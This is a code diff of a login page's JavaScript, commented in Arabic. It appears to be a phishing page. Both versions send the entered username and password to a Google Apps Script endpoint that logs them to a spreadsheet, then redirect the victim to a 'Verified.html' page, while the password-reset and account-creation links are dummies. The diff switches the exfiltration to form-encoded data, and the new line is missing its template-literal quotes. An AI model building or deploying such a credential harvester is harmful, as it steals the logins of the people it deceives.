@@ -277,73 +277,58 @@
     </div>
 
     <script>
-        // ضع هنا رابط Google Apps Script Web App URL
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzga6dZBGi8f0SpNfyV94OxoOyfCUiwylGGXJdyPGBXYIVP0lP4MvTxsmpEekG05CuLGw/exec';
+    // ضع هنا رابط Google Apps Script Web App URL
+    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzga6dZBGi8f0SpNfyV94OxoOyfCUiwylGGXJdyPGBXYIVP0lP4MvTxsmpEekG05CuLGw/exec';
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const loginBtn = document.getElementById('loginBtn');
-            const loadingMsg = document.getElementById('loadingMsg');
-            
-            if (!username || !password) {
-                return; // تم إزالة التنبيه
-            }
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingMsg = document.getElementById('loadingMsg');
+        
+        if (!username || !password) return;
 
-            // تعطيل الزر وإظهار رسالة التحميل
-            loginBtn.disabled = true;
-            loadingMsg.style.display = 'block';
-            
-            // إرسال البيانات إلى Google Sheets باستخدام XMLHttpRequest
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", GOOGLE_SCRIPT_URL, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    // مسح الحقول
-                    document.getElementById('username').value = '';
-                    document.getElementById('password').value = '';
-                    
-                    // إعادة تفعيل الزر وإخفاء رسالة التحميل
-                    loginBtn.disabled = false;
-                    loadingMsg.style.display = 'none';
-                    
-                    // التوجيه إلى صفحة Verified.html بعد تأخير قصير
-                    setTimeout(function() {
-                        window.location.href = 'Verified.html';
-                    }, 500);
-                }
-            };
-            
-            // إرسال البيانات
-            xhr.send(JSON.stringify({
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString()
-            }));
-            
-            // في حالة فشل الطلب، قم بالتحويل بعد 3 ثوانٍ كخطة احتياطية
-            setTimeout(function() {
-                if (document.getElementById('loginForm')) {
+        loginBtn.disabled = true;
+        loadingMsg.style.display = 'block';
+
+        // تحضير البيانات كـ form-urlencoded
+        const params = username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&Date=${encodeURIComponent(new Date().toISOString())}&Status=pending;
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", GOOGLE_SCRIPT_URL, true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // مسح الحقول
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                
+                loginBtn.disabled = false;
+                loadingMsg.style.display = 'none';
+                
+                // التوجيه بعد إرسال البيانات
+                setTimeout(function() {
                     window.location.href = 'Verified.html';
-                }
-            }, 3000);
-        });
-        
-        document.querySelector('.forgot-password').addEventListener('click', function(e) {
-            e.preventDefault();
-            // تم إزالة التنبيه
-        });
-        
-        document.querySelector('.create-button').addEventListener('click', function(e) {
-            e.preventDefault();
-            // تم إزالة التنبيه
-        });
-    </script>
+                }, 500);
+            }
+        };
+
+        xhr.send(params);
+    });
+
+    document.querySelector('.forgot-password').addEventListener('click', function(e) {
+        e.preventDefault();
+    });
+
+    document.querySelector('.create-button').addEventListener('click', function(e) {
+        e.preventDefault();
+    });
+</script>
 </body>
 
 </html>
+
 
